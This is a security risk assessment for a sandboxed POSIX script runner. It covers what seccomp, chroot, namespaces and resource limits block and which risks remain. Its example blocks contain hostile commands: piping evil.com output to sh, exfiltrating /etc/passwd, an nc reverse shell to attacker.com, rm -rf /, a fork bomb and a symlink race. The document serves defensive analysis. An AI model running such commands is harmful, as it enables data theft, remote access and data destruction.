# POSIX Runner V-006 Phase 2: Remaining Security Risks

**Last Updated:** 2026-02-09
**Status:** Post-Sandboxing Analysis
**Related:** `docs/plans/security_remediation_v006_v007_v012.md`

## Executive Summary

V-006 Phase 2 has implemented comprehensive sandboxing for the POSIX runner, reducing the **HIGH** severity vulnerability to a **MEDIUM** residual risk. However, the sandbox is **not complete isolation** - it provides defense-in-depth, not perfect security.

This document answers: **What can still go wrong after sandboxing?**

---

## What the Sandbox PROTECTS Against (V-006 Phase 2)

### 1. Arbitrary Command Execution ✓ MITIGATED
**Before Phase 2:** Shell scripts could execute arbitrary commands via `sh -c`, backticks, `$(...)`, etc.
**After Phase 2:** Seccomp filter blocks `execve`, `fork`, `clone` syscalls, making command execution impossible.

**Test Case:**
```bash
# This script CANNOT execute arbitrary commands:
cat /tmp/malicious.sh
  #!/bin/sh
  rm -rf /  # Blocked by seccomp - execve denied
  curl http://evil.com | sh  # Blocked - socket denied
  (fork_bomb) &  # Blocked - clone denied
```

### 2. Filesystem Access ✓ MITIGATED
**Before Phase 2:** Scripts could read/write arbitrary files on the host filesystem.
**After Phase 2:** Chroot restricts filesystem to `/tmp/ramen_posix_sandbox_*` directory. No access to host filesystem.

**Test Case:**
```bash
# This script CANNOT access host files:
cat /tmp/malicious.sh
  #!/bin/sh
  cat /etc/passwd  # Blocked - chroot prevents escape
  echo "pwned" > /root/.ssh/authorized_keys  # Blocked - no write access
  rm -rf /home/user  # Blocked - chroot isolation
```

### 3. Network Access ✓ MITIGATED
**Before Phase 2:** Scripts could access network resources, exfiltrate data, download payloads.
**After Phase 2:** Network namespace isolation blocks all network access (no sockets).

**Test Case:**
```bash
# This script CANNOT access network:
cat /tmp/malicious.sh
  #!/bin/sh
  curl http://evil.com/steal?data=$(cat /etc/passwd)  # Blocked - no network
  nc attacker.com 4444 -e /bin/sh  # Blocked - socket denied
  wget -O- http://malicious.com/payload | sh  # Blocked - no network
```

### 4. Resource Exhaustion ✓ MITIGATED
**Before Phase 2:** Scripts could consume unlimited CPU, memory, disk, fork bomb the system.
**After Phase 2:** Resource limits prevent abuse:
- CPU: 30 seconds max
- Memory: 256MB max
- File descriptors: 64 max
- Processes: 1 (no children)

**Test Case:**
```bash
# This script CANNOT exhaust resources:
cat /tmp/malicious.sh
  #!/bin/sh
  while true; do :; done  # Killed after 30 seconds CPU time
  yes > /tmp/fill_disk  # Killed after 1MB file write
  :(){ :|:& };:  # Fork bomb blocked - RLIMIT_NPROC=1
```

### 5. Information Leakage ✓ PARTIALLY MITIGATED
**Before Phase 2:** Scripts could read host files, environment variables, process list.
**After Phase 2:** Chroot and namespace isolation limit information leakage.

**What's Protected:**
- No access to host filesystem (`/etc/passwd`, `/home`, etc.)
- No access to host process list (PID namespace isolation)
- No access to host network configuration

**What's NOT Protected:**
- Environment variables still visible
- System architecture and kernel version still visible
- Some `/proc` entries still readable (if mounted)

---

## What the Sandbox DOES NOT Protect Against

### 1. Kernel Exploits HIGH RISK
**Risk:** Malicious scripts could exploit kernel vulnerabilities to escape the sandbox.

**Example Scenario:**
```bash
# A script that exploits a kernel bug:
cat /tmp/malicious.sh
  #!/bin/sh
  # Trigger kernel vulnerability in XFS filesystem
  # to escape chroot and gain root access
  # (hypothetical - for illustration only)
```

**Mitigation:**
- Keep kernel updated with security patches
- Use kernel hardening features (KPTI, SELinux, AppArmor)
- Monitor for CVEs in Linux kernel

**Residual Risk:** HIGH - If kernel is compromised, all bets are off.

### 2. Compromised Parent Process HIGH RISK
**Risk:** If `runtime_supervisor` is compromised, sandbox provides no protection.

**Example Scenario:**
```bash
# An attacker who has compromised runtime_supervisor:
# - Can disable sandbox before spawning script
# - Can modify sandbox configuration
# - Can read/write script content directly
# - Can bypass all sandbox restrictions
```

**Mitigation:**
- Secure runtime_supervisor with least privileges
- Use system-level hardening (systemd sandboxing, SELinux)
- Monitor runtime_supervisor for anomalies

**Residual Risk:** HIGH - Sandbox is only as secure as the parent process.

### 3. Side-Channel Attacks MEDIUM RISK
**Risk:** Malicious scripts could infer information via timing, cache, etc.

**Example Scenario:**
```bash
# A script that uses timing attacks:
cat /tmp/malicious.sh
  #!/bin/sh
  # Measure CPU cycles to infer cache state
  # Deduce which other processes are running
  # Extract cryptographic keys via timing
```

**Mitigation:**
- Use constant-time algorithms in critical code
- Isolate sensitive workloads on separate hardware
- Monitor for suspicious timing patterns

**Residual Risk:** MEDIUM - Side channels are hard to eliminate completely.

### 4. Hardware Vulnerabilities MEDIUM RISK
**Risk:** CPU/hardware vulnerabilities (Spectre, Meltdown, etc.) could allow sandbox escape.

**Example Scenario:**
```bash
# A script that exploits Spectre:
cat /tmp/malicious.sh
  #!/bin/sh
  # Use speculative execution to read host memory
  # Escape sandbox and execute arbitrary code
```

**Mitigation:**
- Keep CPU microcode updated
- Use kernel mitigations (retpoline, KPTI, etc.)
- Monitor for new hardware vulnerabilities

**Residual Risk:** MEDIUM - Depends on hardware vendor response time.

### 5. Denial of Service (DoS) MEDIUM RISK
**Risk:** Malicious scripts could still cause DoS, even with resource limits.

**Example Scenario:**
```bash
# A script that causes DoS despite limits:
cat /tmp/malicious.sh
  #!/bin/sh
  # Exhaust 30 seconds of CPU time per invocation
  # If invoked repeatedly, could starve other processes
  # Resource limits protect against single invocation, not repeated attacks
```

**Mitigation:**
- Rate-limit script invocations
- Use process priority (nice/ionice)
- Monitor for repeated sandbox spawns

**Residual Risk:** MEDIUM - DoS is partially mitigated but not eliminated.

### 6. Information Leakage via Environment Variables LOW-MEDIUM RISK
**Risk:** Scripts can still read environment variables from runtime_supervisor.

**Example Scenario:**
```bash
# A script that leaks environment:
cat /tmp/malicious.sh
  #!/bin/sh
  env > /tmp/env_leak
  # Could contain sensitive data: API keys, tokens, paths
```

**Mitigation:**
- Strip sensitive environment variables before spawning script
- Use environment sanitization
- Avoid passing secrets via environment variables

**Residual Risk:** LOW-MEDIUM - Easy to mitigate but often overlooked.

### 7. Chroot Escape via File Descriptors LOW RISK
**Risk:** If file descriptors to outside chroot are left open, scripts could escape.

**Example Scenario:**
```bash
# A script that escapes via open file descriptor:
cat /tmp/malicious.sh
  #!/bin/sh
  # If runtime_supervisor leaves /proc/self/fd/3 open pointing to host file:
  # Could read/write host filesystem via that fd
```

**Mitigation:**
- Close all unnecessary file descriptors before spawning script
- Use `O_CLOEXEC` flag on all file openings
- Audit all file descriptor passing

**Residual Risk:** LOW - Requires implementation bug in runtime_supervisor.

### 8. Temporary Directory Race Conditions LOW RISK
**Risk:** Temporary chroot directory could be manipulated before creation.

**Example Scenario:**
```bash
# An attacker creates symlink before chroot:
ln -s /etc /tmp/ramen_posix_sandbox_12345
# If script runs, chroot would be to /etc, not isolated directory
```

**Mitigation:**
- Use secure temporary directory creation (`mkdtemp`)
- Check directory ownership after creation
- Use random directory names with high entropy

**Residual Risk:** LOW - Easy to mitigate with proper implementation.

---

## Risk Assessment Matrix

| Risk Category | Likelihood | Impact | Mitigation Status | Residual Risk |
|--------------|-----------|--------|-------------------|---------------|
| Arbitrary command execution | Low | High | Sandboxed (seccomp) | **LOW** |
| Filesystem access | Low | High | Sandboxed (chroot) | **LOW** |
| Network access | Low | Medium | Sandboxed (namespace) | **LOW** |
| Resource exhaustion | Medium | Medium | Sandboxed (rlimits) | **LOW-MEDIUM** |
| Kernel exploits | Low | High | Defense-in-depth | **MEDIUM** |
| Compromised parent process | Low | High | External hardening | **MEDIUM** |
| Side-channel attacks | Medium | Low | Hard to mitigate | **MEDIUM** |
| Hardware vulnerabilities | Low | High | Vendor patches | **MEDIUM** |
| DoS (repeated invocations) | Medium | Low | Rate limiting needed | **MEDIUM** |
| Environment variable leakage | High | Low | Easy to mitigate | **LOW-MEDIUM** |
| Chroot escape via fd | Low | High | Implementation hygiene | **LOW** |
| Temp directory race conditions | Low | Medium | Secure creation | **LOW** |

---

## Comparison: Before vs After Phase 2

### Before Phase 2 (Vulnerable)
```
Shell Script → sh → Full Host Access
                 ├─ Execute arbitrary commands
                 ├─ Read/write host filesystem
                 ├─ Access network resources
                 ├─ Consume unlimited resources
                 └─ Leak host information
```
**Risk Level:** HIGH - Can compromise entire host system

### After Phase 2 (Sandboxed)
```
Shell Script → sh → Sandbox
                     ├─ Seccomp filter (blocks execve, fork, socket)
                     ├─ Namespace isolation (PID, mount, net, UTS)
                     ├─ Chroot (filesystem restricted)
                     ├─ Resource limits (CPU, memory, FDs, processes)
                     └─ → Limited host interaction
```
**Risk Level:** MEDIUM - Can still cause damage but limited scope

### After Phase 4 (Native Runner - Future)
```
Native Binary → WASI/POSIX Personality → Capability System
                                            ├─ Typed access control
                                            ├─ Kernel-mediated IO
                                            ├─ Portal-based file access
                                            └─ → No shell execution
```
**Risk Level:** LOW - No shell execution, capability-based security

---

## Recommendations

### Immediate Actions (Required for Phase 2 Completion)

1. **Strip Environment Variables**
   ```rust
   // In posix_run_v0_sandboxed():
   cmd.env_clear();
   cmd.env("PATH", "/bin:/usr/bin");  // Minimal PATH only
   ```

2. **Secure File Descriptor Handling**
   ```rust
   // Use close-on-exec for all fds
   // Check for leaked fds before spawning
   ```

3. **Rate Limiting**
   ```rust
   // Track spawn attempts per minute
   // Reject requests above threshold
   ```

4. **Audit Temporary Directory Creation**
   ```rust
   // Use std::fs::create_dir_all with proper permissions
   // Verify directory ownership after creation
   ```

### Future Improvements (Phase 3+)

1. **Integrate libseccomp-sys**
   - Replace seccomp tool with in-process filtering
   - More precise syscall filtering
   - Better error handling

2. **Add User Namespace Isolation**
   - Run as unprivileged user inside sandbox
   - Even if sandbox escaped, limited privileges

3. **Add Mandatory Access Control (MAC)**
   - SELinux/AppArmor profiles for runtime_supervisor
   - System-level hardening

4. **Implement Native Runner (Phase 4)**
   - Replace shell script execution with native binaries
   - Capability-based access control
   - No shell = no shell injection

---

## Testing Checklist

### Sandbox Effectiveness Tests
- [ ] Script cannot execute arbitrary commands (execve blocked)
- [ ] Script cannot create child processes (fork blocked)
- [ ] Script cannot access network (socket blocked)
- [ ] Script cannot access host filesystem (chroot works)
- [ ] Script cannot write files > 1MB (FSIZE limit)
- [ ] Script cannot run > 30s CPU time (CPU limit)
- [ ] Script cannot create children (NPROC limit)

### Residual Risk Tests
- [ ] Environment variables are sanitized
- [ ] File descriptors are closed (no fd leak)
- [ ] Temporary directory is securely created
- [ ] Rate limiting prevents DoS
- [ ] Sandbox cleanup works correctly

### Security Tests
- [ ] Attempt to escape chroot via symlink (should fail)
- [ ] Attempt to escape via /proc (should fail)
- [ ] Attempt to escape via open fd (should fail)
- [ ] Attempt to exhaust CPU time (should be killed)
- [ ] Attempt to exhaust memory (should be killed)

---

## Conclusion

V-006 Phase 2 sandboxing **significantly reduces** the attack surface but does not eliminate all risk. The sandbox provides defense-in-depth against common attack vectors (command execution, filesystem access, network access, resource exhaustion) but does not protect against sophisticated attacks (kernel exploits, compromised parent process, side channels).

**Acceptable Use Cases (Post-Phase 2):**
- Development and testing environments
- Controlled deployments with trusted artifacts
- Non-production workloads

**Not Acceptable Use Cases (Even Post-Phase 2):**
- Production environments with untrusted artifacts
- Multi-tenant deployments
- High-security environments

**Recommendation:** Proceed to Phase 4 (Native Runner) for complete mitigation. Use POSIX runner only as a temporary development scaffold.

---

**Document Version:** 1.0
**Last Updated:** 2026-02-09
**Status:** Draft - Ready for Review
